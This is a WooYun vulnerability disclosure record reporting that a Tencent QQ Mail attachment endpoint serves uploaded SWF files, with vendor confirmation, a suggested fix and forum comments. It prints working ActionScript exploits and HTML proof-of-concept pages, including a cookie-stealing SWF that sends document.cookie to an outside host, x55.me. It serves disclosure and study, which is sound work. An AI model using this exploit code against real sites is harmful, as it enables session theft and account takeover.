{"id": 2996, "wybug_id": "wooyun-2014-062461", "wybug_title": "腾讯某分站可上传任意swf文件导致的一系列问题（附简单POC）", "wybug_corp": "腾讯", "wybug_author": "mramydnei", "wybug_date": "2014-05-27 08:47", "wybug_open_date": "2014-07-11 08:47", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传内容未检查"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向公众公开  简要描述： 这个上传点还是有点意思的 详细说明：   最近看了@irsdl的Even uploading a JPG file can lead to Cross Domain Data Hijacking 之后，琢磨着能不能找到一个好一点的实例。google dork了一下json的callback发现被修复的七七八八了。又找了一些*.qq.com上的上传页面也没能找到能上传swf的。最后又迂回到了重兵把守的QQ邮箱，在这里找到了突破点。第一个案例：首先构造一个swf文件，具体的as代码如下(借的)：\npackage com.powerflasher.SampleApp {\timport flash.external.ExternalInterface;\timport flash.display.Sprite;\timport flash.display.Sprite;    import flash.events.Event;    import flash.net.URLLoader;    import flash.net.URLRequest;    import flash.text.TextField;    import flash.text.TextFieldAutoSize;    import flash.xml.*;    import flash.events.IOErrorEvent;\timport flash.events.*;    import flash.net.*;\t/**\t * @author User\t */\t \tpublic class CrossDomainDataHijack extends Sprite {                private var loader:URLLoader;        public function CrossDomainDataHijack() {            loader = new URLLoader();            configureListeners(loader);\t\t\tvar target:String = root.loaderInfo.parameters.input;\t\t\t            var request:URLRequest = new URLRequest(target);            try {                loader.load(request);            } catch (error:Error) {                sendDatatoJS(\"Unable to load requested document; Error: \" + error.getStackTrace());            }        }        private function configureListeners(dispatcher:IEventDispatcher):void {            dispatcher.addEventListener(Event.COMPLETE, completeHandler);            dispatcher.addEventListener(Event.OPEN, openHandler);            dispatcher.addEventListener(ProgressEvent.PROGRESS, progressHandler);            dispatcher.addEventListener(SecurityErrorEvent.SECURITY_ERROR, securityErrorHandler);            dispatcher.addEventListener(HTTPStatusEvent.HTTP_STATUS, httpStatusHandler);            dispatcher.addEventListener(IOErrorEvent.IO_ERROR, ioErrorHandler);        }        private function completeHandler(event:Event):void {            var loader:URLLoader = URLLoader(event.target);            //trace(\"completeHandler: \" + loader.data);    \t\tsendDatatoJS(\"completeHandler: \" + loader.data);        }        private function openHandler(event:Event):void {            //trace(\"openHandler: \" + event);\t\t\tsendDatatoJS(\"openHandler: \" + event);        }        private function progressHandler(event:ProgressEvent):void {            //trace(\"progressHandler loaded:\" + event.bytesLoaded + \" total: \" + event.bytesTotal);\t\t\tsendDatatoJS(\"progressHandler loaded:\" + event.bytesLoaded + \" total: \" + event.bytesTotal);        }        private function securityErrorHandler(event:SecurityErrorEvent):void {            //trace(\"securityErrorHandler: \" + event);\t\t\tsendDatatoJS(\"securityErrorHandler: \" + event);        }        private function httpStatusHandler(event:HTTPStatusEvent):void {            //trace(\"httpStatusHandler: \" + event);\t\t\tsendDatatoJS(\"httpStatusHandler: \" + event);        }        private function ioErrorHandler(event:IOErrorEvent):void {            //trace(\"ioErrorHandler: \" + event);\t\t\tsendDatatoJS(\"ioErrorHandler: \" + event);        }\t\t\t\tprivate function sendDatatoJS(data:String):void{            trace(data);\t\t\tExternalInterface.call(\"sendToJavaScript\", data);\t\t}    }\t\t}\n然后修改swf的扩展名为jpg或其它图片格式的文件的扩展名便于通过上传检测的扩展名检测。然后通过QQ邮箱给自己发送一封邮件，并把我们编译好的swf文件（记得要改扩展名）添加到附件里并发送。\n\n收到邮件后，打开邮件点击附件中的预览按钮并开启Firebug，通过Net对网络通讯进行观察：\n\n从这里可以看出在第三条请求当中当前页面正在像http://sz.mail.ftn.qq.com发送一些HTTP请求，并且response正好是一张图片。复制第三条请求的url：\nhttp://sz.mail.ftn.qq.com/ftn_handler/781c517614e456370aa64e576e2033fda3eb3a341d8659e4a69a9bdc06be37d3?compressed=0&dtype=1&fname=CrossDomainDataHijack.jpg\n试图用浏览器打开时，发现会提示是否要下载。\n\n经过一小系列测试发现，通过修改dtype=2可以让图片直接加载，而不是直接去下载它。\n\n这样一来我们就拥有了一个在*.qq.com下面的swf文件。现在看看能不能实现所谓的CrossDomain datahijack了。编写测试页面（也是借的）：\n<html><head><title>csrftest</title><script>function sendToJavaScript(strData){    var theDiv = document.getElementById(\"HijackedData\");    var content = document.createTextNode(strData);    theDiv.appendChild(content);    theDiv.innerHTML += '<br/>'    //alert(strData);}</script></head><body><div id=HijackedData></div><object id=\"myObject\" width=\"100\" height=\"100\" allowscriptaccess=\"always\" type=\"application/x-shockwave-flash\" data=\"http://sz.mail.ftn.qq.com/ftn_handler/781c517614e456370aa64e576e2033fda3eb3a341d8659e4a69a9bdc06be37d3?compressed=0&dtype=2&fname=CrossDomainDataHijack.jpg\"><param name=\"AllowScriptAccess\" value=\"always\"><param name=\"flashvars\" value=\"input=http://www.qq.com/\"></object></body></html>\n看看是不是直接能够跨域把www.qq.com的html源码弄过来：\n\n测试成功。这意味着我们可能利用这个伪造了扩展名的swf文件来盗取腾讯某些站点下的csrf token或其它一些会包含在html当中的敏感信息。第二个案例：  在第一个案例当中，我们利用的swf文件在当前域下实际上是以content-type:image/jpeg来解析的。我们再试试我们能不能让它在当前域下当作一个swf文件来解析。经过一小系列测试发现，当我们把下面的URL当中的：\nhttp://sz.mail.ftn.qq.com/ftn_handler/781c517614e456370aa64e576e2033fda3eb3a341d8659e4a69a9bdc06be37d3?compressed=0&dtype=2&fname=CrossDomainDataHijack.jpg\nfname后面的CrossDomainDataHijack.jpg修改为test.swf时，页面会以Content-type:application/x-shockwave-flash来解析，如下图：\n\n 这回我们算是在真正的意义上，上传了一个swf文件。需要补充的是，该文件的访问权限是任何人。也就是说不存在权限问题而不能被利用起来。唯一麻烦的就是URL当中的这段hash\n781c517614e456370aa64e576e2033fda3eb3a341d8659e4a69a9bdc06be37d3\n会在30分钟左右过期，需要我们每间隔30分钟，重新使用案例1中的方法获取新的URL（无需重新上传）。这次再写一个能偷cookie的swf文件，代码如下：\npackage {\timport flash.external.ExternalInterface;\timport flash.display.Sprite;\timport flash.display.Sprite;    import flash.events.Event;    import flash.net.URLLoader;    import flash.net.URLRequest;    import flash.text.TextField;    import flash.text.TextFieldAutoSize;    import flash.xml.*;    import flash.events.IOErrorEvent;\timport flash.events.*;    import flash.net.*;\t/**\t * @author User\t */\t \tpublic class csrf extends Sprite {                private var loader:URLLoader;        public function csrf() {\t\t\tvar res:String = ExternalInterface.call(\"function(){return document.cookie;}\");            doGet(res);        }\t\t\t\tprivate function doGet(res:String):void{\t\t\tloader = new URLLoader();\t\t\tvar target:String = \"http://x55.me/geo.php?get=\"+res;            var request:URLRequest = new URLRequest(target);            try {                loader.load(request);            } catch (error:Error) {                sendDatatoJS(\"Error: \" + error.getStackTrace());            }\t\t}\t\t\t\tprivate function sendDatatoJS(data:String):void{            trace(data);\t\t\tExternalInterface.call(\"colsole.log\", data);\t\t}    }\t\t}\n重复案例一种的步骤进行上传和参数修改。得到URL：\nhttp://sz.mail.ftn.qq.com/ftn_handler/595af2ea431bfa68bc5e2e515d3a83a39752af9a4cc701539ad5b70b759a175d?compressed=0&dtype=2&fname=1.swf\n做一个测试页面用来盗取用户的cookies:\n<html><head><title>steal cookies test</title></head><body><iframe src=\"http://sz.mail.ftn.qq.com/ftn_handler/595af2ea431bfa68bc5e2e515d3a83a39752af9a4cc701539ad5b70b759a175d?compressed=0&dtype=2&fname=1.swf\" width=0 heigth=0></body></html>\n当用户访问我们特定的页面时，cookie将被窃取：\n\n\n\n对盗号不感冒，所以不知道具体都可以登录哪些业务。但是至少测试可以用uin和skey成功登录aq.qq.com\n\n   漏洞证明：  见详细说明   修复方案：  对文件头和格式进行检测   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-27 15:53 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-27 08:59 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n   * ?    \n     2014-05-27 09:05 |    \t\t蓝颜 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:29        )\t\t \n  * ?    \n     2014-05-27 09:19 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  * ?    \n     2014-05-27 09:23 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  *!    \n     2014-05-27 09:30 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  *花    \n     2014-05-27 09:36 |    \t\t酱油党 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 跳槽观望中)\t\t \n  *$    \n     2014-05-27 10:11 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  *#06#    \n     2014-05-27 11:31 |    \t\t寒江不钓 \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:11        | 无他，但手熟耳            微博： http://...)\t\t \n  http://www.freebuf.com/articles/web/35353.html？    \n     2014-05-27 15:03 |    \t\tz7y丶 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 我是z7y的表弟)\t\t \n  4sad561    \n     2014-05-27 20:06 |    \t\t二狗子 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 农村非主流)\t\t \n  ascniwead    \n     2014-06-28 17:48 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  漂亮    \n     2014-06-30 21:02 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  跪倒在M神脚下    \n     2014-07-11 15:15 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  一年的膝盖，请收下    \n     2014-07-11 18:32 |    \t\tArthur \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:33        | USA，I am coming！！！！！)\t\t \n  楼主是黑客！    \n     2014-08-25 04:39 |    \t\tLiuk3r \t\t\t( 实习白帽子  |\t\t\t        Rank:90 漏洞数:10        | 习惯了一个人的生活，变得沉默、变得冷落、...)\t\t \n  good - -   楼主我们做朋友吧！！     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}